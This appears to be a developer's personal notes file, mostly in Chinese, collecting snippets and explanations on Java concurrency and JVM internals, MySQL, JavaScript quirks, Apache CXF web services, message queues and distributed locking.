log_queries_not_using_indexes = off #记录没有使用索引的查询 不论执行有多块

--------------------------------------------------------------------------------------
BCD码这种编码形式利用了四个位元来储存一个十进制的数码,可保存数值的精确度，又可免去使电脑作浮点运算时所耗费的时间
BCD码可分为有权码和无权码两类：
有权BCD码有8421码、2421码、5421码，其中8421码是最常用的；
无权BCD码有余3码，余3循环码
--------------------------------------------------------------------------------------
https://github.com/love-somnus/J2SE
https://github.com/rongzhu8888/magic-dao
--------------------------------------------------------------------------------------
http://note.youdao.com/share/?id=80b842230a0087a520c9cc61e3fb0c21&type=note jms消息模型
http://note.youdao.com/share/?id=5ed5cf21bc0a409f975f7ffb63cf240c&type=note Tomcat性能调优
--------------------------------------------------------------------------------------
update test_tb a inner join test_tb_2 b
 on a.o_id = b.o_id
  and b.code_value like '1234%'
   set a.o_value = 13;
--------------------------------------------------------------------------------------
<tx:annotation-driven transaction-manager="transactionManager" proxy-target-class="true"/>

--------------------------------------------------------------------------------------
jQuery给span取值：$("#id").html();
$('input[type="radio"][name="radio"]:checked').val();
--------------------------------------------------------------------------------------
https://github.com/huiyan-fe/mapv 地图可视化
--------------------------------------------------------------------------------------
ZeroMQ仅提供非持久性的队列
--------------------------------------------------------------------------------------
mysql
length: 是计算字段的长度一个汉字是算三个字符,一个数字或字母算一个字符
char_length:不管汉字还是数字或者是字母都算是一个字符
--------------------------------------------------------------------------------------
stringbuilder stringbuffer reverse方法
AbstractStringBuilder public AbstractStringBuilder reverse()

public final class StringBuffer extends AbstractStringBuilder implements java.io.Serializable, CharSequence
public final class StringBuilder extends AbstractStringBuilder implements java.io.Serializable, CharSequence

--------------------------------------------------------------------------------------
Vector 是一个线程安全的容器正确用法
Thread removeThread = new Thread(new Runnable() {
				public void run() {
					synchronized (vector) {
						for (int i = 0; i < vector.size(); i++) {
							try {
								vector.remove(i);
							} catch (Exception e) {
								System.exit(0);
							}
						}
					}

				}
			});
--------------------------------------------------------------------------------------
StringBuilder sb = new StringBuilder("Ingredients: ");
if (ingredients.length > 0) {
    sb.append(ingredients[0]);//避免每次判断
    for (int i = 1; i < ingredients.length; i++) {
        sb.append(", ");
        sb.append(ingredients[i]);
    }
}

return sb.toString();
--------------------------------------------------------------------------------------
判断一段代码是否是热点代码 热点探测
探测算法有两种
基于采样的热点探测 某些方法经常出现在栈顶
基于计数器的热点探测 为每个方法（甚至是代码块）建立计数器

HotSpot 方法调用计数器和回边计数器
解释 编译 混合模式
--------------------------------------------------------------------------------------
JobStore为Quartz任务和触发器提供了一个存储途径
--------------------------------------------------------------------------------------
$(document).ready(function(){
    $("li").click(function(){
        var str_span = $(this).find('span').html();
        alert(str_span);
    });
});

--------------------------------------------------------------------------------------
redis
setnx key_1 value_1

--------------------------------------------------------------------------------------
https://github.com/ShikiRyougi/cactus
--------------------------------------------------------------------------------------
http://shihlei.iteye.com/blog/2124411 git eclipse操作
--------------------------------------------------------------------------------------
https://github.com/qala-io/datagen
--------------------------------------------------------------------------------------
https://github.com/cnfree/Eclipse-Class-Decompiler eclipse-class-decompiler
--------------------------------------------------------------------------------------
统一资源定位符 URL
统一资源标识符 URI

每个URL都是URI，但不一定每个URI都是URL
URI还包括一个子类，即统一资源名称(URN)，它命名资源但不指定如何定位资源mailto、news和isbnURI都是URN的示例

在Java类库中，URI类不包含任何访问资源的方法，它唯一的作用就是解析
URL类可以打开一个到达资源的流

--------------------------------------------------------------------------------------
ParsePosition 是 Format 及其子类所使用的简单类，用来在分析过程中跟踪当前位置
--------------------------------------------------------------------------------------
空值不一定为空 timstamp auto_increment属性
空值不等于空字符
--------------------------------------------------------------------------------------
任意两个不小于 2 的自然数 a、b，有 a + b ≤ a * b

拆解方案只包含 2、3 两个数字
2 出现的次数少于 3 次
n 拆解后最大乘积的 通项公式 ：
f(2) = 1
f(3) = 2
f(3k) = 3 ^k (k ≥ 2)
f(3k+1) = 2 * 2 * 3 ^k-1 (k ≥ 1)
f(3k+2) = 2 * 3^ k (k ≥ 1)

--------------------------------------------------------------------------------------
怎么体现javascript的继承关系？
使用prototype来实现
--------------------------------------------------------------------------------------
form中的input可以设置为readonly和disable，请问2者有什么区别？
readonly不可编辑，但可以选择和复制；值可以传递到后台
disabled不能编辑，不能复制，不能选择；值不可以传递到后台
--------------------------------------------------------------------------------------
.form中的input有哪些类型？
text:文本框
password:密码框
radio:单选按钮
checkbox:复选框
file:文件选择域
hidden:隐藏域
button:按钮
reset:重置按钮
submit:表单提交按钮
--------------------------------------------------------------------------------------
d = new Date();//4-29
s += d.getMonth() + "/";  4
s += d.getDate() + "/";  29
s += d.getYear();  116
--------------------------------------------------------------------------------------
对象在内存中储存的布局可以分为 3 块区域：对象头、实例数据和对齐填充
对象头包括两部分：
a) 储存对象自身的运行时数据，如哈希码、 GC 分带年龄、锁状态标志、线程持有的锁、偏向线程 ID 、偏向时间戳
b) 另一部分是指类型指针，即对象指向它的类元数据的指针，虚拟机通过这个指针来确定这个对象是那个类的实例

--------------------------------------------------------------------------------------
对象的访问定位
使用句柄访问
Java 堆中将会划分出一块内存来作为句柄池,reference 中存储的就是对象的句柄地址,而句柄中包含了对象实例数据与类型数据各自的具体地址

优势:reference 中存储的是稳点的句柄地址,在对象被移动 ( 垃圾收集时移动对象是非常普遍的行为 ) 时只会改变句柄中的实例数据指针，而 reference 本身不需要修改

使用直接指针访问
Java堆对象的布局就必须考虑如何访问类型数据的相关信息,而 refreence 中存储的直接就是对象的地址

优势：速度更快，节省了一次指针定位的时间开销，由于对象的访问在Java中非常频繁，因此这类开销积少成多后也是一项非常可观的执行成本
--------------------------------------------------------------------------------------
并行（Parallel） -- 多个垃圾收集线程可以并行工作，但用户线程处于等待状态
并发（Concurrent） -- 用户线程与收集线程可以同时执行
--------------------------------------------------------------------------------------
CMS 是使用标记-清除算法实现的，整个收集过程分为四步：
初始标记 -- 这一步工作中需要暂停所有线程，他标记所有 GC Roots 能够直接关联到的对象，因此速度非常快
并发标记 -- 进行 GC RootsTracing 也就是可达性判断
重新标记 -- 修正并发标记期间因为用户程序继续运作而导致变动的对象的标记记录，也会造成停顿
并发清除 -- 清除内存中无用的对象
--------------------------------------------------------------------------------------
Serial Old
Serial Old 是 Serial 的老年代版本，同样是一个单线程收集器
它使用标记-整理算法
--------------------------------------------------------------------------------------
Parallel Scavenge
Parallel Scavenge 收集器的目标是可控制吞吐量(并行清除)

--------------------------------------------------------------------------------------
mysql 的事务性存储引擎大多使用一种用来增加并发性的加锁机制 -- 多版本并发控制（MVCC）
InnoDB 通过为每一行记录添加两个额外的隐藏值来实现 MVCC，这两个值一个记录这行数据何时被创建时的系统版本号，一个记录这行数据何时被删除时的系统版本号，每个事务在开始的时候都会记录他自己的系统版本号，每个查询必须去检查每行数据的版本号与事务的版本号是否相同

只有事务版本号小于等于记录的删除版本号并且大于等于记录的创建版本号的记录才会被事务查询到

--------------------------------------------------------------------------------------
惊群现象指的是当多个进程或线程在等待同一资源时，当该资源突然由不可用变为可用，虽然资源只能供一个进程或线程使用，但所有线程或进程都被唤醒去竞争这一资源

--------------------------------------------------------------------------------------
(function () {
    return typeof arguments;
})();
"object"
arguments功能类似数组，但实际上是一个对象

function foo(x) {
    console.log(x); // 10
    for (var i=0; i<arguments.length; i++) {
        console.log(arguments[i]); // 10, 20, 30
    }
}
foo(10, 20, 30);
--------------------------------------------------------------------------------------
var f = function g() {
    return 23;
};
typeof f(); number
typeof g();  Error

typeof g()，不是typeof g；这两者的区别在于函数调用"()"的运算优先级高于typeof 函数表达式 g无法再被正常访问
--------------------------------------------------------------------------------------
(function (x) {
    delete x;
    return x;
})(1); 1
delete是用来删除对象的属性的，它不能够删除函数中传递的参数

var xiaoming = {
    name: '小明'
};
xiaoming.age; // undefined
xiaoming.age = 18; // 新增一个age属性
xiaoming.age; // 18
delete xiaoming.age; // 删除age属性
xiaoming.age; // undefined
delete xiaoming['name']; // 删除name属性
xiaoming.name; // undefined
delete xiaoming.school; // 删除一个不存在的school属性也不会报错
--------------------------------------------------------------------------------------
var y = 1,
x = y = typeof x;
x;
"undefined"  赋值运算符由右向左运算
--------------------------------------------------------------------------------------
(function f(f) {
    return typeof f();
})(function () {
    return 1;
});
"number"

首先参数函数执行f()结果为1；typeof 1结果为"number"
--------------------------------------------------------------------------------------
var foo = {
bar: function () {
    return this.baz;
},
    baz: 1
};
(function () {
    return typeof arguments[0]();
})(foo.bar);
"undefined"
this指向window
--------------------------------------------------------------------------------------
var foo = {
bar: function () {
    return this.baz;
},
    baz: 1
};
typeof (f = foo.bar)();
"undefined"
this指向window
--------------------------------------------------------------------------------------
var f = (function f() {
return "1";
}, function g() {
    return 2;
})();
typeof f;
"number"
返回的是最后的一个值
--------------------------------------------------------------------------------------
var x = 1;
if (function f() {}) {
    x += typeof f;
}
x;
"1undefined"
函数只是if的判定条件，没有经过声明；所以typeof f返回"undefined"
--------------------------------------------------------------------------------------
var x = [typeof x, typeof y][1];
typeof typeof x;
"string"
typeof "undefined"返回"string"，typeof "string"依然返回"string"
--------------------------------------------------------------------------------------
(function (foo) {
    return typeof foo.bar;
})({
    foo: {
        bar: 1
    }
});
"undefined"

var a = { foo:{ bar:1 } }
typeof a.bar

--------------------------------------------------------------------------------------
(function f() {
    function f() {
        return 1;
    }
    return f();
    function f() {
        return 2;
    }
})();
2
两个函数都是普通声明的函数，会被优先解析
--------------------------------------------------------------------------------------
function f() {
    return f;
}
new f() instanceof f;
false
instanceof是用来检测原型的，如果是原型返回true，否则返回false
return了一个返回值f，导致new出来的东西与原来期望的实例化对象已经不是一个东西了

function f() {
    return this;
}
new f() instanceof f; //true
--------------------------------------------------------------------------------------
with (function(x, undefined){}) length;
2
with 限定了作用域是这个函数，function.length 返回函数的参数个数，所以是 2
(function(x,undefined) {}).length
--------------------------------------------------------------------------------------
Throwable是一个接口还是抽象类-->具体类
--------------------------------------------------------------------------------------
public interface TestInvocation {
    public static final Runnable RUNNABLE
        = new Runnable() {
        @Override
        public void run() {
            System.out.println(
                "类似这样,利用类加载机制,当然,也可以是其他类的类型."
            );
        }
    };
}
Java 8里面添加了默认方法
--------------------------------------------------------------------------------------
select concat( date_format(current_timestamp, '%Y%m%d%H%i%s'),'-', UUID() );
uuid排序
--------------------------------------------------------------------------------------
Date today = new Date();
Calendar cal = Calendar.getInstance();
cal.setTime(today);
cal.add(Calendar.MONTH, 1); // 加一个月
cal.add(Calendar.DATE, -1); // 减一天
//
Date nextM = cal.getTime();
System.out.println(nextM);
--------------------------------------------------------------------------------------
List<String> listS = new ArrayList<String>();
List<Test_S> listI = new ArrayList<Test_S>();
// 下面的代码执行(输出)结果是什么?
if (listS instanceof List<Test_S>) {  -->报错 泛型擦除
	System.out.println("listS instanceof List<Test_S>=" + true);
} else {
	System.out.println("listS instanceof List<Test_S>=" + false);
}
--------------------------------------------------------------------------------------
Oracle 查询树形结构的关键字
connect by prior , 大数据量可能会卡死
--------------------------------------------------------------------------------------
MySQL 的 bin-log 的理解
两种格式: 基于语句，基于行
--------------------------------------------------------------------------------------
在Java 8之前的实现中是用链表解决冲突的，在产生碰撞的情况下，进行get时，两步的时间复杂度是O(1)+O(n)
因此，当碰撞很厉害的时候n很大，O(n)的速度显然是影响速度的
因此在Java 8中，利用红黑树替换链表，这样复杂度就变成了O(1)+O(logn)了
HashMap的做法是用链表和红黑树存储相同hash值的value当Hash冲突的个数比较少时，使用链表，否则使用红黑树
HashMap还是凭借数组实现的，辅以链表和红黑树

当节点个数>= TREEIFY_THRESHOLD - 1时，HashMap将采用红黑树存储
static final int TREEIFY_THRESHOLD = 8;

红黑树更是一颗自平衡的排序二叉树
--------------------------------------------------------------------------------------
https://github.com/toutouge/WebProject/tree/master/WobblySlideshowEffect 横向切换
--------------------------------------------------------------------------------------
Thread thread = new Thread(new Runnable() {
    public void run() {
        /*
         * 在这里为一个循环，条件是判断线程的中断标志位是否中断
         */
        while (true&&(!Thread.currentThread().isInterrupted())) {
            try {
                Log.i("tag","线程运行中"+Thread.currentThread().getId());
                // 每执行一次暂停40毫秒
                //当sleep方法抛出InterruptedException  中断状态也会被清掉
                Thread.sleep(40);
            } catch (InterruptedException e) {
                e.printStackTrace();
                //如果抛出异常则再次设置中断请求
                Thread.currentThread().interrupt();
            }
        }
    }
});
thread.start();

//触发条件设置中断
thread.interrupt();
--------------------------------------------------------------------------------------
public class ImprovedList<T>{
    public List<T> list=Collections.synchronizedList(new ArrayList<T>());
    //保证同一个锁
    public synchronized boolean putIfAbsent(T x){
            synchronized(list){
            boolean flag=list.contains(x);
            if(!flag)
                 list.add(x);
            return !flag;
        }
    }
}
--------------------------------------------------------------------------------------
SpringMVC的入口是servlet，而Struts2是filter
--------------------------------------------------------------------------------------
https://segmentfault.com/a/1190000005342905
--------------------------------------------------------------------------------------
Executors为Executor，ExecutorService，ScheduledExecutorService，ThreadFactory和Callable类提供了一些工具方法
Executors可以用于方便的创建线程池
--------------------------------------------------------------------------------------
在Java中，同步容器主要包括2类：
1Vector、Stack、HashTable
2Collections类中提供的静态工厂方法创建的类

Vector实现了List接口，Vector实际上就是一个数组，和ArrayList类似，但是Vector中的方法都是synchronized方法，即进行了同步措施
Stack也是一个同步容器，它的方法也用synchronized进行了同步，它实际上是继承于Vector类
HashTable实现了Map接口，它和HashMap很相似，但是HashTable进行了同步处理，而HashMap没有
--------------------------------------------------------------------------------------
Java集合类都是快速失败的，这就意味着当集合被改变且一个线程在使用迭代器遍历集合的时候，
迭代器的next()方法将抛出ConcurrentModificationException异常

并发容器支持并发的遍历和并发的更新
主要的类有ConcurrentHashMap, CopyOnWriteArrayList 和CopyOnWriteArraySet
--------------------------------------------------------------------------------------
Lock-->ReentrantLock ReadLock WriteLock
可以使锁更公平
可以使线程在等待锁的时候响应中断
可以让线程尝试获取锁，并在无法获取锁的时候立即返回或者等待一段时间
--------------------------------------------------------------------------------------
jps -v 查看下java进程的参数
--------------------------------------------------------------------------------------
rocketmq启动后监听 9876端口
--------------------------------------------------------------------------------------
消息模型
1、点对点（P2P）模式
P2P模式包含三个角色：消息队列（Queue），发送者(Sender)，接收者(Receiver)
每个消息都被发送到一个特定的队列，接收者从队列中获取消息队列保留着消息，直到他们被消费或超时

P2P的特点：
1）每个消息只有一个消费者，一旦被消费，消息就不再在消息队列中
2）发送者和接收者之间在时间上没有依赖性，也就是说当发送者发送了消息之后，不管接收者有没有正在运行，不会影响到消息被发送到队列
3）接收者在成功接收消息之后需向队列应答成功

生产者/消费者（Pub/Sub）
模式包含三个角色主题（Topic），发布者（Publisher），订阅者（Subscriber）
多个发布者将消息发送到Topic,系统将这些消息传递给多个订阅者

Pub/Sub的特点：
1）每个消息可以有多个消费者
2）发布者和订阅者之间有时间上的依赖性针对某个主题（Topic）的订阅者，它必须创建一个订阅者之后，才能消费发布者的消息
3）为了消费消息，订阅者必须保持运行的状态或者创建一个可持久化的订阅这样，即使订阅者没有被激活（运行），它也能接收到发布者的消息

消息消费
对于消费来说，有两种方式：
1、同步
订阅者或接收者在接收到消息之前一直堵塞

2、异步订阅者或接收者注册一个消息监听器，消息到达后，读取消息


RabbitMQ
流行的、开源的消息队列用AMQP（高级消息队列协议）标准实现 erlang语言

Kafka
高吞吐量的分布式发布订阅消息系统
持久化
高吞吐
集群、分区
支持Hadoop

JMS编程模型
ConnectionFactory
创建Connection对象的工厂，分别有QueueConnectionFactory和TopicConnectionFactory两种

Destination
Destination的意思是消息生产者的消息发送目标或者说消息消费者的消息来源,Queue、Topic

Connection
Connection表示在客户端和JMS系统之间建立的链接（对TCP/IP socket的包装）QueueConnection和TopicConnection

Session
Session是操作消息的接口可以通过session创建生产者、消费者、消息等 QueueSession和TopicSession

消息的生产者
消息生产者由Session创建，并用于将消息发送到Destination QueueSender和TopicPublisher

消息消费者
消息消费者由Session创建，用于接收被发送到Destination的消息两种类型：QueueReceiver和TopicSubscriber

MessageListener
消息监听器 调用监听器的onMessage方法
--------------------------------------------------------------------------------------
hibernate
load方法在缓存中没有发现对象的情况下，只会返回一个代理对象，只有在对象getId()之外的其它方法被调用时才会真正去访问数据库

瞬时态(Transient)、持久态(Persistent)、脱管态(Detached)
瞬时态由new命令开辟内存空间的java对象，
session执行close()或clear()、evict()之后，持久对象变成脱管对象
delete()方法，对应的持久对象就变成瞬时对象

持久对象具有如下特点：
1. 和session实例关联；
2. 在数据库中有与之关联的记录

update操作的是脱管状态的对象
而flush是操作的在持久状态的对象
--------------------------------------------------------------------------------------
alter user 'root'@'localhost' password expire never
--------------------------------------------------------------------------------------
show global status where variable_name in('com_select','com_insert','com_delete','com_update');
--------------------------------------------------------------------------------------
typeof undefined
"undefined"
--------------------------------------------------------------------------------------
a = (b =5 , c =b+1 , d =c+1)
7
--------------------------------------------------------------------------------------
1、当没有记录的时候，使用聚集函数，会导致出现一条记录，记录的取值都是NULL，如下：
mysql> select name from student where name='David';
Empty set
mysql> select name,avg(age) from student where name='David';
+------+----------+
| name | avg(age) |
+------+----------+
| NULL | NULL |
+------+----------+
1 row in set
2、对于取值为NULL的记录，不参与聚集函数的计算
--------------------------------------------------------------------------------------
mysql里异或运算符为^ 或者 xor
null与任何条件（真、假、null）做异或，结果都为null
--------------------------------------------------------------------------------------
主键字段可以确保唯一性，但主键字段不能为NULL.
唯一性约束可以确保唯一性，但唯一性约束的字段可以为NULL
唯一性约束对含有NULL的记录不起作用，即可以重复加入含有NULL的记录，主键字段不能未NULL
--------------------------------------------------------------------------------------
order by convert(name using gbk) asc;
--------------------------------------------------------------------------------------
标记-清除算法 产生大量不连续的内存碎片
复制算法 每次只使用一块
标记-压缩 Mark-Compact：先标记，然后将存活对象移向一边，再清理掉边界以外的内存
分代收集算法 新生代一般采用复制算法，年老代采用标记-压缩算法
--------------------------------------------------------------------------------------
事务执行 update 流程
用排它锁锁定满足条件的行
记录 redo log
把该行修改前的值复制到 undo log
修改当前行的值，填写事务编号，使回滚指针指向 undo log 中修改前的行
当事务发生异常，则根据回滚指针从 undo log 中找出事务修改前的版本，并恢复
--------------------------------------------------------------------------------------
HelloServiceImpl helloworldImpl = new HelloServiceImpl();
//cxf发布服务的工厂bean
ServerFactoryBean svrFactory = new ServerFactoryBean();
svrFactory.getServiceFactory().getConfigurations().add(new MethodNameSoapActionServiceConfiguration());
//设置服务类
svrFactory.setServiceClass(HelloService.class);
//设置服务地址
svrFactory.setAddress("http://localhost:9001/Hello");
//设置服务bean
svrFactory.setServiceBean(helloworldImpl);
svrFactory.create();
--------------------------------------------------------------------------------------
web.xml
<servlet>
        <servlet-name>CXFServlet</servlet-name>
        <servlet-class>
               org.apache.cxf.transport.servlet.CXFServlet
        </servlet-class>
        <load-on-startup>1</load-on-startup>
</servlet>

<servlet-mapping>
         <servlet-name>CXFServlet</servlet-name>
         <url-pattern>/webservice/*</url-pattern>
</servlet-mapping>

--------------------------------------------------------------------------------------
@WebService
public interface HelloService {
  public String sayHello(@WebParam(name="text")String text);
  public User getUserByName(String name);
}

@WebService(endpointInterface="com.elgin.cxf.service.HelloService",
            targetNamespace="http://service.cxf.elgin.com/")
public class HelloServiceImpl implements HelloService {
}

客户端调用方法一（使用wsdl2Java工具手动生成服务端接口代码）
wsdl2java  -d  D:\\src  -client  http://localhost:8080/CXFWebDemo/services/hello ? wsdl

<bean id="helloService" class="com.elgin.cxf.service.HelloService"
                           factory-bean="clientFactory" factory-method="create"/>

<!-- client 工厂 ，用来产生service实例 -->
<bean id="clientFactory" class="org.apache.cxf.jaxws.JaxWsProxyFactoryBean" >
    <property name="serviceClass" value="com.elgin.cxf.service.HelloService"/>
    <property name="address" value="http://localhost:8080/CXFWebDemo/services/hello"></property>
</bean>

HelloService helloService=(HelloService) ctx.getBean("helloService");
String  result = helloService.sayHello("World");

客户端调用方法二 用 JaxWsDynamicClientFactory创建动态的客户端
JaxWsDynamicClientFactory factory=JaxWsDynamicClientFactory.newInstance();
//创建客户端
Client client=factory.createClient("http://localhost:8080/CXFWebDemo/services/hello?wsdl");
Object [] result;
QName qname;
try {
  //根据指定的命名空间（接口类包名）、方法名新建QName对象
  qname=new QName("http://service.cxf.elgin.com/", "sayHello");
  result=client.invoke(qname, "World");
  System.out.println(result[0]);


--------------------------------------------------------------------------------------
webservice
方法的执行是在服务端，客户端只做发送xml、接收xml、解析xml

--------------------------------------------------------------------------------------
cxf是处理不了map 手动写工具类将它转换为CXF可以处理的类型
 extends XmlAdapter<StringCat, Map<String, Cat>>

public @XmlJavaTypeAdapter(FkXmlAdapter.class)
Map<String, Cat> getAllCats();
--------------------------------------------------------------------------------------
cxf权限控制:拦截器
拦截器使用流程：客户端（out）-> 服务端（in）->处理业务->服务端（out）->客户端（in）

服务端 extends AbstractPhaseInterceptor<SoapMessage>
end.getInInterceptors().add(new LoggingOutInterceptor());

客户端 extends AbstractPhaseInterceptor<SoapMessage>
client.getOutInterceptors().add

<jaxws:endpoint
        id="wsAndroidService1"
        implementor="#androidService"
        address="/android">
        <jaxws:inInterceptors>
            <bean class="com.malone.filter.AndroidServiceLoggingInterceptor"/>
        </jaxws:inInterceptors>
</jaxws:endpoint>

<jaxrs:server id="restUserService" address="/restFul">
        <jaxrs:serviceBeans>
            <ref bean="userServiceRestFul" />
        </jaxrs:serviceBeans>
        <jaxrs:extensionMappings>
            <entry key="json" value="application/json" />
            <entry key="xml" value="application/xml" />
        </jaxrs:extensionMappings>
</jaxrs:server>

<jaxws:client id="hello" serviceClass="com.xj.service.IHello" address="http://localhost/cxf/testHello?wsdl">
</jaxws:client>


--------------------------------------------------------------------------------------
namespace（命名空间） = http://tempuri.org/
soapAction = namespace + methodName（方法名）
--------------------------------------------------------------------------------------

HTTP 请求头 Range
请求资源的部分内容(不包括响应头的大小), 单位是byte,即字节,从0开始.
如果服务器能够正常响应的话，服务器会返回206 Partial Content的状态码及说明.
如果不能处理这种Range的话，就会返回整个资源以及响应状态码为200 OK.（

--------------------------------------------------------------------------------------
HashSet它的add的方法里，是通过HashMap的key唯一性来实现的，而内部的HashMap的value，
是一个固定的值private static final Object PRESENT = new Object()
--------------------------------------------------------------------------------------
元数据区
-XX:MetaspaceSize：指定初始时的元数据区大小
例如：-XX:MetaspaceSize=128M

-XX:MaxMetaspaceSize：指定元数据区的最大可用值
例如： -XX:MaxMetaspaceSize=256M

--------------------------------------------------------------------------------------
jackson
class UnixTimestampDeserializer extends JsonDeserializer<DateTime>

class TimestampThing {
    @JsonDeserialize(using = UnixTimestampDeserializer.class)
    DateTime timestamp
--------------------------------------------------------------------------------------
@RunWith(SpringJUnit4ClassRunner.class)
@ContextConfiguration("classpath:spring.xml")

--------------------------------------------------------------------------------------
<parent>
		<groupId>org.emacsist</groupId>
		<artifactId>emacsist-project</artifactId>
		<version>1.0.0</version>
		<relativePath>../emacsist-project/pom.xml</relativePath>
</parent>
--------------------------------------------------------------------------------------
http://note.youdao.com/share/?id=8927d00b982bb562f6197712ac34c856&type=notebook#/ hadoop笔记
--------------------------------------------------------------------------------------
postgresql 默认端口5432

https://github.com/postgres-cn/pgdoc-cn  中文手册
--------------------------------------------------------------------------------------
@Expose
String json = new GsonBuilder().excludeFieldsWithoutExposeAnnotation().create().toJson(t);
--------------------------------------------------------------------------------------
spring mvc 3 list array大小256报错
DataBinder
BeanWrapperImpl growCollectionIfNecessary检查

Controller中加入
@InitBinder
protected void initBinder(WebDataBinder binder) {
    binder.setAutoGrowNestedPaths(true);
    binder.setAutoGrowCollectionLimit(1024);
}

spring mvc 4
private int autoGrowCollectionLimit = Integer.MAX_VALUE;
--------------------------------------------------------------------------------------
spring的实现ApplicationListener<ContextRefreshedEvent>接口的方式 启动时候执行方法
--------------------------------------------------------------------------------------
synchronized(this)对当前对象是同步的，所以只有一个线程可以访问每个实例，但不同的线程可以访问不同的实例
例如，你有很多线程和很多该类实例，但是同时每个实例对应的同步内容都可以被一个线程访问

synchronized(ClassName.class)对当前对象的类（或其他类）是同步的，所以只有一个线程可以访问该类的实例
例如，你有很多线程和很多该类实例，但是同时只允许一个线程访问一个实例的同步内容
--------------------------------------------------------------------------------------
数据同步
服务器A和C之间只能通过中间库B访问，现A定时产生大量数据，需要同步给C
a、A服务器往B服务器写入数据，数据增加自增序列
b、C系统定时扫描B服务器中间表数据，找出当前序列字段最大值，读取小于等于该值的所有数据，最后删除小于等于该值的所有数据

a、在B服务器建立一个辅助操作表，记录一个标示，标示有三个值，一个表示“空闲”，一个表示“正在写”，一个表示“正在读”
b、A服务器在写数据之前，先获取状态标示，如果为“空闲”，则进入“准备写入数据”状态，并且把标示改为“正在写”
c、如果此时标示为“正在读”，则等待，隔一段时间再检查标示
d、A服务器在真正写入数据之前，再次检查状态标示，如果为“正在读”，进入c步骤，如果为“正在写”则开始写入数据（再次检查是防止“空闲”状态下，两者同时修改状态标示，所以再次检查跟第一次检查需要间隔几秒钟）
e、A服务器写完数据后，将状态标示修改为“空闲”
f、C系统取数据之前，同样先获取状态标示，如果为“空闲”，进入“准备取数据”状态，并且把标示改为“正在读”
g、如果此时标示为“正在写”，则等待，隔一段时间再检查标示
h、C系统再真正取数据之前，再次检查状态标示，如果为“正在写”，进去g步骤，如果为“正在读”，则开始取数据
i、C系统取完数据，将整表truncate，然后将状态标示修改为“空闲"
--------------------------------------------------------------------------------------
rmdir, rmdir + 空目录，用于删除空目录
chmod -R 777 /home/aoi
--------------------------------------------------------------------------------------
mysql
 基于语句的复制 NOW()，当同一条SQL在从库中执行的时候显然和在主库中执行的结果是不一样的

--------------------------------------------------------------------------------------
动态绑定失效
1、基类方法是private或final修饰的
2、方法是static修饰的

--------------------------------------------------------------------------------------
评估可用性
例如:一个依赖30个SOA服务的系统,每个服务99.99%可用
99.99%的30次方 ≈ 99.7%
0.3% 意味着一亿次请求 会有 3,000,00次失败
换算成时间大约每月有2个小时服务不稳定.
随着服务依赖数量的变多，服务不稳定的概率会成指数性提高.
--------------------------------------------------------------------------------------
int  fromHash=System.identityHashCode(fromAccount);
int  toHash=System.identityHashCode(toAccount);

if(fromHash<toHash){
    synchronized (fromAccount) {
        synchronized (toAccount) {
            new Helper().transfer();
        }
    }
}else if(fromHash>toHash){
    synchronized (toAccount) {
        synchronized (fromAccount) {
            new Helper().transfer();
        }
    }
}else{
    synchronized (myLock) {
        synchronized (fromAccount) {
            synchronized (toAccount) {
                new Helper().transfer();
            }
        }
    }
}

解决协作对象之间发生的死锁：需要使用开放调用，即避免在持有锁的情况下调用外部的方法
--------------------------------------------------------------------------------------
Java Socket判断远端网络断开
public boolean isConnected(){
        try{
            //Socket 往输出流发送一个字节的数据
            s.sendUrgentData(0xFF);
            return true;
        }catch(Exception e){
            return false;
        }
}
--------------------------------------------------------------------------------------
基于数据库表做乐观锁，用于分布式锁
a. 先执行select操作查询当前数据的数据版本号,比如当前数据版本号是26：
select id, resource, state,version from t_resource  where state=1 and id=5780;

b. 执行更新操作：
update t_resoure set state=2, version=27, update_time=now() where resource=xxxxxx and state=1 and version=26
update语句真正更新影响到了一行数据，那就说明占位成功
增加了数据库操作的次数 每个资源都有一张资源表


使用redis的setnx()、get()、getset()方法，用于分布式锁 (单例) lockkey唯一,避免删除其他进程获取的锁
1. setnx(lockkey, 当前时间+过期超时时间)   ，如果返回1，则获取锁成功；如果返回0则没有获取到锁，转向2
2. get(lockkey)获取值oldExpireTime ，并将这个value值与当前的系统时间进行比较，如果小于当前系统时间，则认为这个锁已经超时，
可以允许别的请求重新获取，转向3
3. 计算newExpireTime=当前时间+过期超时时间，然后getset(lockkey, newExpireTime) 会返回当前lockkey的值currentExpireTime
4. 判断currentExpireTime与oldExpireTime 是否相等，如果相等，说明当前getset设置成功，获取到了锁
如果不相等，说明这个锁又被别的请求获取走了，那么当前请求可以直接返回失败，或者继续重试
5. 在获取到锁之后，当前线程可以开始自己的业务处理，当处理完毕后，比较自己的处理时间和对于锁设置的超时时间，
如果小于锁设置的超时时间，则直接执行delete释放锁；如果大于锁设置的超时时间，则不需要再锁进行处理

使用memcached的add()方法，用于分布式锁
需要在add()的使用指定有效时间

memcached
add方法用于向memcache服务器添加一个要缓存的数据
set方法用于设置一个指定key的缓存内容，set方法是add方法和replace方法的集合体
replace方法用于替换一个指定key的缓存内容，如果key不存在则返回false


redis
客户端A在主节点获得了一个锁
主节点挂了，而到从节点的写同步还没完成
从节点被提升为主节点
客户端B获得和A相同的锁注意，锁安全性被破坏了

1获取当前时间，以毫秒为单位
2以串行的方式 尝试从所有的N个实例中获取锁，使用的是相同的key值和相同的随机value值
在从每个实例获取锁时，客户端会设置一个连接超时，其时长相比锁的自动释放时间要短得多
例如，若锁的自动释放时间是10秒，那么连接超时大概设在5到50毫秒之间这可以避免当Redis节点挂掉时，
会长时间堵住客户端：如果某个节点没及时响应，就应该尽快转到下个节点
3客户端计算获取所有锁耗费的时长，方法是使用当前时间减去步骤1中的时间戳
当且仅当客户端能从多数节点（至少3个）中获得锁，并且耗费的时长小于锁的有效期时，可认为锁已经获得了
4如果锁获得了，它的最终有效时长将重新计算为其原时长减去步骤3中获取锁耗费的时长
5如果锁获取失败了（要么是没有锁住N/2+1个节点，要么是锁的最终有效时长为负数），
客户端会对所有实例进行解锁操作

--------------------------------------------------------------------------------------
$(function () {
            //除了表头（第一行）以外所有的行添加click事件.
            $("tr").first().nextAll().click(function () {
                //为点击的这一行切换样式bgRed里的代码：background-color:#FF0000;
                $(this).children().toggleClass("bgRed");
                //判断td标记的背景颜色和body的背景颜色是否相同;
                if ($(this).children().css("background-color") != $(document.body).css("background-color")) {
                    //如果相同，CheckBox.checked=true;
                    $(this).children().first().children().attr("checked", true);

                } else {
                    //如果不同,CheckBox.checked=false;
                    $(this).children().first().children().attr("checked", false);
                }
            });
});
--------------------------------------------------------------------------------------
mysql
方差
select variance(id) from test_user

标准差
